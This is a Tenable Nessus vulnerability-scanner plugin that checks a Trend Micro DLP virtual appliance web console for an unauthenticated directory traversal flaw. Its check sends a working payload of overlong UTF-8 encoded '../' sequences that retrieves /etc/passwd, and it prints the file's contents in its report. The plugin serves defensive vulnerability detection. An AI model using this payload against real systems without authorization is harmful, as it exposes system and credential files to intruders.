#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(55456);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2015/09/24 23:21:21 $");

  script_bugtraq_id(48225);
  script_osvdb_id(73447);
  script_xref(name:"EDB-ID", value:"17388");

  script_name(english:"Trend Micro Data Loss Prevention Virtual Appliance Encoded Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve the application's /etc/passwd file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts an application that is prone to a
directory traversal attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The instance of Trend Micro Data Loss Prevention Web Console
listening on this port allows an unauthenticated, remote attacker to
retrieve arbitrary files through its web server using specially
crafted requests with encoded directory traversal sequences.

This can result in the disclosure of sensitive information, such as
the appliance's /etc/password file and other sensitive files."
  );
  script_set_attribute(attribute:"solution", value:"At the time of this writing, there is no vendor solution.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2011/06/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/06/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");

  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("trendmicro_dlpva_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/trendmicro_dlpva_web_console");
  script_require_ports("Services/www", 8443);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:8443);
install = get_install_from_kb(appname:"trendmicro_dlpva_web_console", port:port, exit_on_fail:TRUE);

# Try to exploit the issue to retrieve a file.
file     = '/etc/passwd';
file_pat = 'root:.*:0:[01]:';


url = '/dsc//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae' + file;
res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

if (res[2] && egrep(pattern:file_pat, string:res[2]))
{
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to exploit the issue to retrieve the contents of' +
      '\n' + '\'' + file + '\' on the remote host using the following URL :' +
      '\n' +
      '\n' + '  ' + build_url(port:port, qs:url) + '\n';

    if (report_verbosity > 1)
      report +=
        '\n' + 'Here are its contents :' +
        '\n' +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
        '\n' + chomp(res[2]) +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else exit(0, "The Trend Micro DLP web console listening on port "+port+" is not affected.");
